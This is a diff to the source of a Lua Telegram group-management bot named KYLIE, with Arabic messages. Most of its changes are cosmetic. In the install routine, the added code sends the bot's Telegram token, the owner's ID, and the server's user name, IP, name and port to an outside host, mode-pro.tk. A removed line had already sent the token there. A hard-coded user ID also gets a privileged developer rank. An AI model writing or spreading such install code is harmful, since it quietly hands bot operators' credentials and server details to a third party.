@@ -26,31 +26,42 @@ file:write(serialized)
 file:close()  
 end  
 if not database:get(id_server..":token") then
-io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ\n\27')
+io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n\27')
 local token = io.read()
 if token ~= '' then
 local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
 if res ~= 200 then
-print('\27[0;31m⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
+print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
 else
-io.write('\27[0;31m تم حفظ التوكن بنجاح \na⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ\n27[0;39;49m')
+io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
 database:set(id_server..":token",token)
 end 
 else
-print('\27[0;35m⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ \n لم يتم حفظ التوكن ارسل لي التوكن الان')
+print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua KYLIE.lua')
 end
 if not database:get(id_server..":SUDO:ID") then
-io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ\n\27[0;33;49m')
-local SUDOID = io.read()
-if SUDOID ~= '' then
-io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ\n27[0;39;49m')
-database:set(id_server..":SUDO:ID",SUDOID)
-else
-print('\27[0;31m⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ \n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
-end 
+io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
+local SUDOID = io.read():gsub(' ','') 
+if tostring(SUDOID):match('%d+') then
+data,res = https.request("https://mode-pro.tk/KYLIE/index.php?bn=KYLIE&id="..SUDOID)
+if res == 200 then
+getIs = json:decode(data)
+if getIs.Info.info == 'Is_Spam' then
+io.write('\n\27[1;31mانت محظور من السورس\n\27[0;39;49m')
 os.execute('lua KYLIE.lua')
+end
+if getIs.Info.info == 'Ok' then
+io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
+database:set(id_server..":SUDO:ID",SUDOID)
+end 
+local t = json:decode(https.request('https://mode-pro.tk/KYLIE/index.php?n=KYLIE&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+else
+io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
+end  
+os.execute('lua KYLIE.lua')
+end 
 end
 if not database:get(id_server..":SUDO:USERNAME") then
 io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
@@ -75,7 +86,6 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('http://mode-pro.tk/KYLIE/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("KYLIE", "w")  
 file:write([[
@@ -85,15 +95,15 @@ token="]]..database:get(id_server..":token")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
-echo "⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ⊶──────────≺𝙀𝙔𝙀≻───────────⊷"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ┉  ┉ ┉ ┉ ┉≺𝙀𝙔𝙀≻ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "TG IS NOT FIND IN FILES BOT"
-echo "⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ ⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ "
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ"
 exit 1
 fi
 if [ ! $token ]; then
-echo "⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ ⊶──────────≺𝙀𝙔𝙀≻───────────⊷ ٴ "
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ"
 echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
-echo "⊶──────────≺𝙀𝙔𝙀≻───────────⊷"
+echo "ٴ≪┉ ┉ ┉ ┉ ┉ ≺𝙀𝙔𝙀≻ ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉ ┉ ┉┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉┉ ┉"
 exit 1
 fi
 echo -e "\033[38;5;208m"
@@ -143,9 +153,9 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
- ✓                     ✓
-⇑━━🇪​🇾​🇪​━━⇓
- ✓                     ✓
+✓                       ✓
+  ⇑━━🇪​🇾​🇪​━━⇓
+✓                     ✓
 > CH › @ppppd
 ~> DEVELOPER › @PPPPZ
 ]])
@@ -299,8 +309,6 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1214622341) then  
 var = 'مطور السورس'
-elseif tonumber(user_id) == tonumber(1553530032) then
-var = 'مبرمجة السورس'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:mode:2", user_id) then 
@@ -379,6 +387,7 @@ end
 end
 return var
 end
+
 function dl_cb(a,d)
 end
 function getChatId(id)
@@ -481,14 +490,14 @@ function Reply_Status(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
 if data.first_name_ ~= false then
 local UserName = (data.username_ or "ppppd")
-local NameUser = "*꙳.︙بواسطه »* ["..data.first_name_.."](T.me/"..UserName..")"
-local NameUserr = "*꙳.︙اسم المستخدم »* ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUser = "꙳.︙ بواسطه » ["..data.first_name_.."](T.me/"..UserName..")"
+local NameUserr = "꙳.︙ اسم المستخدم » ["..data.first_name_.."](T.me/"..UserName..")"
 if status == "reply" then
 send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
 return false
 end
 else
-send(msg.chat_id_, msg.id_,"꙳.︙الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
+send(msg.chat_id_, msg.id_,"꙳.︙ الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
 end
 end,nil)   
 end 
@@ -528,13 +537,13 @@ local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChat
 local Json_Info = JSON.decode(Chek_Info)
 if Json_Info.ok == true then
 if Json_Info.result.status == "creator" then
-Send(msg.chat_id_,msg.id_,'\n꙳.︙مالك الكروب')   
+Send(msg.chat_id_,msg.id_,'\n꙳.︙ مالك الكروب')   
 return false  end 
 if Json_Info.result.status == "member" then
-Send(msg.chat_id_,msg.id_,'\n꙳.︙مجرد عضو هنا ')   
+Send(msg.chat_id_,msg.id_,'\n꙳.︙ مجرد عضو هنا ')   
 return false  end
 if Json_Info.result.status == 'left' then
-Send(msg.chat_id_,msg.id_,'\n꙳.︙الشخص غير موجود هنا ')   
+Send(msg.chat_id_,msg.id_,'\n꙳.︙ الشخص غير موجود هنا ')   
 return false  end
 if Json_Info.result.status == "administrator" then
 if Json_Info.result.can_change_info == true then
@@ -669,7 +678,7 @@ end
 function Addmp3(msg,chat,kkl,ffrr)
 local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
-sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"𝙆𝙮𝙡𝙞𝙚 ")  
+sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"𝙆𝙮𝙡𝙞𝙚 💥")  
 os.execute('rm -rf ./'..ffrr) 
 end
 function Addsticker(msg,chat,Sd,rre)
@@ -681,14 +690,14 @@ end
 function AddFile_Bot(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
 if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
-send(chat,msg.id_," ꙳.︙ملف نسخه ليس لهاذا البوت")
+send(chat,msg.id_," ꙳.︙  ملف نسخه ليس لهاذا البوت")
 return false 
 end      
 local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
-send(chat,msg.id_," ꙳.︙جاري ...\n ꙳.︙رفع الملف الان")
+send(chat,msg.id_," ꙳.︙  جاري ...\n ꙳.︙  رفع الملف الان")
 else
-send(chat,msg.id_,"* ꙳.︙عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
+send(chat,msg.id_,"* ꙳.︙ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
 end      
 local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
 local groups = JSON.decode(info_file)
@@ -720,13 +729,13 @@ database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)
 end
 end
 end
-send(chat,msg.id_,"\n ꙳.︙تم رفع الملف بنجاح وتفعيل الكروبات\n ꙳.︙ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
+send(chat,msg.id_,"\n ꙳.︙ تم رفع الملف بنجاح وتفعيل الكروبات\n ꙳.︙ ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
 end
 local function trigger_anti_spam(msg,type)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
 local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
 if type == 'kick' then 
-Text = '\n ꙳.︙العضــو » '..Name..'\n ꙳.︙قام بالتكرار هنا وتم طرده '  
+Text = '\n ꙳.︙ العضــو » '..Name..'\n ꙳.︙ قام بالتكرار هنا وتم طرده '  
 sendText(msg.chat_id_,Text,0,'md')
 chat_kick(msg.chat_id_,msg.sender_user_id_) 
 my_ide = msg.sender_user_id_
@@ -770,12 +779,12 @@ DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
 end;end;end, nil)
 msgm = msgm - 1048576
 end
-Text = '\n ꙳.︙العضــو » '..Name..'\n ꙳.︙قام بالتكرار هنا وتم تقييده '  
+Text = '\n ꙳.︙ العضــو » '..Name..'\n ꙳.︙ قام بالتكرار هنا وتم تقييده '  
 sendText(msg.chat_id_,Text,0,'md')
 return false  
 end  
 if type == 'mute' then
-Text = '\n ꙳.︙العضــو » '..Name..'\n ꙳.︙قام بالتكرار هنا وتم كتمه '  
+Text = '\n ꙳.︙ العضــو » '..Name..'\n ꙳.︙ قام بالتكرار هنا وتم كتمه '  
 sendText(msg.chat_id_,Text,0,'md')
 database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
 msgm = msg.id_
@@ -823,7 +832,7 @@ end
 end
 if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == "الغاء" or text == "الغاء ꙳." then   
-send(msg.chat_id_, msg.id_," ꙳.︙تم الغاء الاذاعه")
+send(msg.chat_id_, msg.id_," ꙳.︙ تم الغاء الاذاعه")
 database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
@@ -854,7 +863,7 @@ sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)
 database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
 end 
 end
-send(msg.chat_id_, msg.id_," ꙳.︙تمت الاذاعه الى *~ "..#list.." ~* كروب ")
+send(msg.chat_id_, msg.id_," ꙳.︙ تمت الاذاعه الى *~ "..#list.." ~* كروب ")
 database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end
@@ -866,7 +875,7 @@ local textchuser = database:get(bot_id..'text:ch:user')
 if textchuser then
 send(msg.chat_id_, msg.id_,'['..textchuser..']')
 else
-send(msg.chat_id_, msg.id_,' ꙳.︙لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ꙳.︙اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+send(msg.chat_id_, msg.id_,' ꙳.︙ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ꙳.︙ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
 end
 return false
 end
@@ -908,13 +917,13 @@ database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
 return false
 end
 if not Devmode(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
-send(msg.sender_user_id_, msg.id_,' ꙳.︙تم ارسال رسالتك\n ꙳.︙سيتم رد في اقرب وقت')
+send(msg.sender_user_id_, msg.id_,' ꙳.︙ تم ارسال رسالتك\n ꙳.︙ سيتم رد في اقرب وقت')
 tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
 vardump(data)
 if data and data.messages_[0].content_.sticker_ then
 local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
-local Text = ' ꙳.︙تم ارسال الملصق من ↓\n - '..Name
+local Text = ' ꙳.︙ تم ارسال الملصق من ↓\n - '..Name
 sendText(SUDO,Text,0,'md')
 end 
 end,nil) 
